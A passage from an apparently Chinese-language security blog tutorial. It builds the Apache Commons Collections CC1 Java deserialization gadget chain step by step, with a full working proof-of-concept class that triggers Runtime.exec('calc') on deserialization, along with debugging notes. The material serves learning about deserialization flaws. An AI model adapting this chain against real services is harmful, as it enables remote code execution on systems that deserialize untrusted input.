class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>有一个遍历Map的功能，里面有setvalue</p><p>然后就要看一下<code>AnnotationInvocationHandler</code>​的什么参数是可控的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">6182022883658399397L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br><br>    AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;<br>        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();<br>        <span class="hljs-keyword">if</span> (!type.isAnnotation() ||<br>            superInterfaces.length != <span class="hljs-number">1</span> ||<br>            superInterfaces[<span class="hljs-number">0</span>] != java.lang.annotation.Annotation.class)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationFormatError</span>(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>        <span class="hljs-built_in">this</span>.type = type;<br>        <span class="hljs-built_in">this</span>.memberValues = memberValues;<br>    &#125;<br></code></pre></td></tr></table></figure><p>由于这个不是public所以不能直接访问，需要通过反射进行访问</p><p>所以修改一下我们的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-comment">//        Class c = Runtime.class;</span><br><span class="hljs-comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="hljs-comment">//        execMethod.invoke(r,&quot;calc&quot;);</span><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <span class="hljs-comment">//invokerTransformer.transform(r)</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,invokerTransformer);<br><br><span class="hljs-comment">//        for (Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="hljs-comment">//            entry.setValue(r);</span><br><span class="hljs-comment">//        &#125;</span><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstruction</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationHandlerConstruction.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//Override.class → 随便找一个合法的注解类型（必须是注解类，否则构造函数会报错）</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationHandlerConstruction.newInstance(Override.class,transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="两个问题"><a href="#两个问题" class="headerlink" title="两个问题"></a>两个问题</h3><p>1.setvalue是不可控的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br></code></pre></td></tr></table></figure><p>2.我们代码里面的Runtime是不可序列化的（没有继承serialize接口）</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802223418-9k9uf2k.png" alt="image"></p><h4 id="Runtime对象不能序列化问题–解决"><a href="#Runtime对象不能序列化问题–解决" class="headerlink" title="Runtime对象不能序列化问题–解决"></a>Runtime对象不能序列化问题–解决</h4><p> <em>（在解决这个问题的时候我把其余代码都注释掉只留了相关代码）</em></p><p>首先它的class是可以序列化的</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250802224026-1cu6c7a.png" alt="image"></p><p>所以这一部分可以写为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>execMethod.invoke(r,<span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>转化为用链子的Sink点 InvokerTransformer的transform来反射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;).transform(Runtime.class);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;).transform(getRuntimeMethod);<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250803151259-rhlkbtk.png" alt="image"></p><p>这里可以发现是后一个调用前一个，也就是transform的循环调用，这时候就想到了前面可以递归调用的ChainedTransformer</p><p>再来回顾一下它的具体细节</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Transforms the input to result via each decorated transformer</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> object  the input object passed to the first transformer</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> the transformed result</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br></code></pre></td></tr></table></figure><p>构造函数里面传一个transformer的数组，然后再做一个递归的调用</p><p>那么再来修改一下我们的代码</p><p>先定义一个transformer数组，再把刚刚的放入数组里面，再进行一次transform的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250803152848-4mj1qj1.png" alt="image"></p><p>正常执行了，那么这个问题就解决了</p><p>把注释掉的部分都弄出来，简单的修改一下如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-comment">//        Runtime r = Runtime.getRuntime();</span><br><span class="hljs-comment">//        Class c = Runtime.class;</span><br><span class="hljs-comment">//        Method execMethod = c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="hljs-comment">//        execMethod.invoke(r,&quot;calc&quot;);</span><br><span class="hljs-comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="hljs-comment">//        //invokerTransformer.transform(r)</span><br><br><span class="hljs-comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        chainedTransformer.transform(Runtime.class);<br><br><span class="hljs-comment">//        Class c = Runtime.class;</span><br><span class="hljs-comment">//        Method getRuntimeMethod = c.getMethod(&quot;getRuntime&quot;, null);</span><br><span class="hljs-comment">//        Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);</span><br><span class="hljs-comment">//        Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">//        execMethod.invoke(r,&quot;calc&quot;);</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTransformer);<br><span class="hljs-comment">//</span><br><span class="hljs-comment">////        for (Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="hljs-comment">////            entry.setValue(r);</span><br><span class="hljs-comment">////        &#125;</span><br><span class="hljs-comment">//</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstruction</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationHandlerConstruction.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//Override.class → 随便找一个合法的注解类型（必须是注解类，否则构造函数会报错）</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationHandlerConstruction.newInstance(Override.class,transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="setvalue是不可控的-解决"><a href="#setvalue是不可控的-解决" class="headerlink" title="setvalue是不可控的-解决"></a>setvalue是不可控的-解决</h4><p>刚刚的代码依旧执行不了，是由几个原因的：<br>1.可能没有进去if里面</p><p>2.setvalue是不可控的</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250803153809-6mryjxr.png" alt="image"></p><p>下个断点看一下</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250803154122-oxl9n7u.png" alt="image"></p><p>可以看到这里menberType为null，所以根本没有进入循环，直接就会出来，那么就根本没有走到我们想执行的setvalue方法</p><p>逻辑是它获取type，获取它的成员方法，在<code>memberTypes.get(name)</code>​查找它</p><p>那我们怎么进行更改呢</p><p>我们就必须要找一个有成员方法的class，数组的key要改成成员方法的名字</p><p>​<code>Override</code>​里面的Target有成员方法value</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250803155008-vygbey8.png" alt="image"></p><p>那么将<code>Override</code>​改为Target，key改为value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTransformer);<br><span class="hljs-comment">//</span><br><span class="hljs-comment">////        for (Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="hljs-comment">////            entry.setValue(r);</span><br><span class="hljs-comment">////        &#125;</span><br><span class="hljs-comment">//</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstruction</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationHandlerConstruction.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//Override.class → 随便找一个合法的注解类型（必须是注解类，否则构造函数会报错）</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationHandlerConstruction.newInstance(Target.class,transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>...<br></code></pre></td></tr></table></figure><p>这个时候再试一次</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250803155802-agxmszd.png" alt="image"></p><p>可以看到这个时候已经不为空了，进入循环</p><p>终于走到setvalue了，如果控制我们就可以命令执行，那么我们跟进去</p><p>发现了</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250803160153-o3s2mwb.png" alt="image"></p><p>这个其实就是我们的chainedtransformer，我们要把value的值改为Runtime.class，而现在是如上图所示，因为它的函数逻辑已经写了</p><p>这个时候想到了我们之前看到的ConstantTransformer，虽然最后的东西我们控制不了，只要把最后的那个点调用它的transform就可以把那个值改过来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>             <span 